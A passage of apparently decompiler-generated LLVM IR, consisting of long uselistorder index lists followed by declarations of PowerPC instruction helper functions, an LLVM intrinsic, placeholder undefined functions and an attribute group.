1124, 1126, 1129, 1136, 213, 1137, 1138, 1139, 4, 1153, 1154, 1155, 117, 116, 1156, 5, 118, 222, 900, 119, 901, 902, 6, 1214, 1215, 170, 1217, 1216, 54, 7, 1218, 169, 8, 1219, 172, 1220, 55, 9, 1221, 171, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1074, 1075, 1090, 261, 1091, 1092, 1093, 1222, 1223, 1224, 1225, 1226, 262, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 120, 121, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 38, 1249, 122, 81, 1250, 1251, 1252, 1253, 1254, 123, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 124, 1264, 1265, 1266, 241, 242, 1267, 1268, 1269, 25, 10, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 85, 1425, 1426, 1427, 1430, 1428, 11, 173, 1290, 1289, 174, 1288, 86, 1291, 1292, 1293, 125, 1294, 1396, 1420, 1421, 1164, 1165, 223, 1166, 1431, 126, 1432, 1397, 1433, 1434, 1435, 1436, 1437, 1438, 1439, 1440, 1131, 263, 264, 1455, 1456, 265, 1457, 1477, 175, 1478, 266, 1469, 12, 1441, 1442, 127, 1398, 1399, 267, 268, 269, 1400, 1401, 70, 71, 1402, 1403, 1404, 270, 1405, 1406, 1407, 68, 69, 1408, 1409, 1443, 1444, 1445, 1446, 1447, 1448, 128, 1454, 961, 962, 963, 964, 965, 129, 966, 967, 968, 243, 969, 271, 970, 224, 272, 273, 274, 1410, 275, 1411, 130, 890, 131, 891, 892, 132, 893, 133, 903, 176, 87, 276, 904, 905, 13, 977, 894, 895, 134, 896, 897, 898, 1169, 1171, 39, 1172, 72, 1173, 1170, 1167, 1168, 14, 910, 906, 907, 908, 909, 177, 15, 1142, 1140, 1141, 178, 1143, 1144, 911, 912, 913, 914, 915, 277, 916, 917, 1174, 1175, 278, 1176, 135, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 244, 245, 279, 1177, 1178, 179, 1179, 1180, 1181, 1182, 1188, 1189, 1190, 1191, 136, 1192, 1193, 1194, 1458, 1459, 1460, 1461, 1462, 1463, 1464, 1465, 280, 1466, 16, 137, 138, 1295, 1296, 26, 27, 225, 28, 1297, 180, 1298, 1299, 181, 281, 1300, 1183, 1184, 1185, 1186, 1187, 1301, 1302, 182, 1070, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1470, 1471, 1472, 73, 1473, 1474, 1475, 1476, 139, 1303, 1304, 1305, 1306, 1307, 1308, 140, 1094, 1076, 1077, 1078, 1079, 1080, 1087, 1083, 1084, 1085, 1086, 183, 1088, 1089, 1081, 17, 74, 1082, 918, 1095, 919, 920, 1309, 1310, 88, 1311, 1312, 1313, 1314, 1315, 214, 1316, 1317, 1318, 141, 1319, 1320, 1321, 1322, 1323, 142, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 143, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 40, 158, 159, 184, 1342, 1343, 144, 1344, 282, 1345, 1346, 283, 1349, 149, 145, 1347, 1348, 285, 1350, 1351, 1352, 1354, 150, 1355, 18, 19, 151, 152, 146, 147, 1356, 1357, 148, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 284, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 865, 1378, 29, 1380, 75, 89, 153, 286, 1382, 246, 1383, 1379, 1381, 1384, 1385, 154, 866, 867, 82, 56, 80, 1353, 185, 1449, 1451, 1450, 187, 155, 1453, 1452, 186, 226, 1098, 1099, 287, 1100, 156, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 288, 1110, 1111, 1112, 1113, 1114, 1115, 215, 1386, 1387, 289, 1116, 1060, 1061, 1062, 1063, 1064, 1065, 1429, 290, 971, 973, 1413, 921, 1414, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 979, 1135, 1467, 1468, 293, 292, 933, 934, 76, 77, 21, 189, 20, 190, 188, 297, 935, 30, 936, 41, 160, 295, 296, 42, 161, 228, 227, 294, 191, 298, 299, 291, 937, 938, 939, 941, 207, 940, 942, 943, 302, 303, 300, 301, 944, 305, 306, 234, 229, 230, 231, 232, 233, 945, 304, 78, 307, 308, 946, 947, 948, 309, 949, 310, 311, 90, 91, 950, 92, 43, 197, 196, 195, 951, 952, 93, 44, 194, 193, 192, 953, 312, 94, 45, 203, 95, 46, 47, 202, 201, 162, 954, 96, 48, 200, 313, 955, 97, 49, 199, 98, 50, 198, 314, 956, 235, 315, 236, 957, 316, 958, 317, 960, 204, 959, 163, 237, 319, 238, 318, 320, 321, 972, 322, 323, 157, 325, 974, 31, 239, 240, 324, 79, 975, 976, 326, 327, 328, 51, 52, 978, 329, 210, 53, 980, 1195, 1388, 1389, 247, 1390, 1391, 205, 1487, 1488, 1489, 1412, 868, 869, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1511, 1512 }
  uselistorder i32* @lr, { 5, 148, 149, 150, 151, 152, 153, 154, 289, 390, 391, 392, 155, 159, 156, 157, 158, 163, 164, 160, 161, 162, 165, 166, 167, 168, 169, 6, 7, 8, 11, 9, 10, 170, 173, 171, 1, 172, 0, 174, 176, 177, 175, 178, 179, 180, 181, 182, 183, 184, 185, 17, 290, 291, 186, 187, 188, 189, 292, 293, 294, 295, 190, 397, 398, 399, 400, 361, 393, 394, 395, 396, 191, 196, 211, 197, 198, 199, 212, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 236, 237, 239, 241, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 257, 258, 259, 18, 19, 20, 296, 297, 298, 401, 299, 300, 200, 201, 206, 207, 208, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 402, 403, 313, 314, 260, 261, 404, 405, 414, 415, 418, 419, 420, 421, 422, 435, 437, 439, 416, 417, 362, 363, 364, 365, 366, 367, 368, 406, 412, 413, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 12, 13, 21, 15, 22, 14, 16, 262, 264, 263, 23, 24, 25, 26, 27, 28, 265, 266, 267, 254, 255, 256, 242, 67, 96, 238, 235, 120, 240, 121, 122, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 281, 282, 283, 284, 285, 423, 424, 425, 426, 427, 430, 431, 432, 315, 316, 317, 318, 279, 280, 438, 436, 319, 320, 321, 209, 202, 204, 205, 203, 29, 210, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 3, 4, 336, 407, 408, 409, 410, 411, 433, 434, 213, 214, 215, 216, 217, 218, 219, 220, 350, 351, 30, 192, 193, 194, 195, 354, 31, 32, 33, 34, 35, 428, 429, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 68, 74, 69, 70, 71, 72, 73, 2, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 286, 287, 288, 352, 353, 355, 356, 357, 358, 359, 360, 385, 386, 387, 388, 389 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #0

declare i32 @__asm_mfcr() local_unnamed_addr

declare %1 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare %0 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare i4 @__asm_mcrf_cr0_read(i1, i1, i1, i1) local_unnamed_addr

declare i32 @unknown_0(i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8** @__decompiler_undefined_function_4() local_unnamed_addr

attributes #0 = { nounwind readnone }
